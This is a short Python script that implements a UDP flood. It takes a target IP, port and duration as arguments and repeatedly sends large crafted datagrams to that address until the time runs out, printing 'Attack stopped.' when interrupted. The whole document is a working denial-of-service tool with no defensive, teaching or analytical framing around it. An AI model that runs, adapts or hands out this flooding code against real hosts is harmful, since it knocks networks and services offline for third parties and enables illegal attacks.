import socket
import sys
from time import time as tt

ip = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])

def attack(ip, port, time):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    startup = tt()
    data = bytearray(56656)
    data[0] = 0x1B
    data[1] = 0x00
    data[2] = 0xFF
    data[3] = 0x7F
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
    addr = (str(ip),int(port))
    while True:

        endtime = tt()
        if (startup + time) < endtime:
            break
        
        s.sendto(data, addr)

if __name__ == '__main__':
    try:
        attack(ip, port, time)
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")